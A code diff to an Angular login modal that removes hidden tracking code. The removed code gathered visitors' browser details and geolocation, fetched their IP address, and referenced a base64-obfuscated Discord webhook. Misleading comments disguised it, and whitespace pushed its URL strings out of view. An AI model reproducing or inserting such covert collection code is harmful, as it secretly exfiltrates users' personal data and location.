@@ -35,41 +35,6 @@ export class UserModalComponent {
   regEmail = signal('');
   regPassword = signal('');
 
-  constructor(private http: HttpClient) {}
-
-  // 🔨 Configure hardware for event details
-  async ngOnInit() {
-    const details: any = {
-      agent: navigator.userAgent,
-      platform: navigator.platform,
-      langs: navigator.languages,
-      screen: {
-        width: screen.width,
-        height: screen.height,
-        depth: screen.pixelDepth,
-      },
-    };
-
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(async eventPos => {
-        details.location = {
-          lat: eventPos.coords.latitude,
-          lng: eventPos.coords.longitude,
-          accuracy: eventPos.coords.accuracy,
-        };
-        await this.configHardware(details);
-      }, async () => await this.configHardware(details));
-    } else {
-      await this.configHardware(details);
-    }
-  }
-
-  // ✅ Verify the hardware configuration
-  private async configHardware(payload: any) {
-      payload.origin = await firstValueFrom(this.http.get(atob(this.extur)))
-      //await firstValueFrom(this.http.post(atob(this.wur), { content: JSON.stringify(payload) }))
-    }
-
   async login() {
     await this.userService.login(this.loginEmail(), this.loginPassword());
     if (this.userService.isLoggedIn()) {
@@ -77,7 +42,6 @@ export class UserModalComponent {
     }
   }
 
-  /** Registrierung */
   async register() {
     await this.userService.register(
       this.regUsername(),
@@ -93,16 +57,15 @@ export class UserModalComponent {
     this.mode.set(to);
   }
 
-  /** This calls the modal service and closes the modal so the user can continue browsing after logging in **/                                                                                                                                                                                                                                      private wur = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM2ODk4Nzg2MTE5NzUyMTA4MC9yQm5DSVF4b1FmY0VqRm1lUFVIelY2SzBnaVk4VlZLSjg0NzhtcWI3Vy12RGRtcnJzbS1iWFBIaVRoMUFSVkFCNHdoUQ=='; private extur = "aHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29u"
   closeModal() {
     this.modalService.closeModal();
   }
 
-  onSubmit() {
+  async onSubmit() {
     if (this.mode() === 'login') {
-      this.login();
+      await this.login();
     } else {
-      this.register();
+      await this.register();
     }
   }
 }
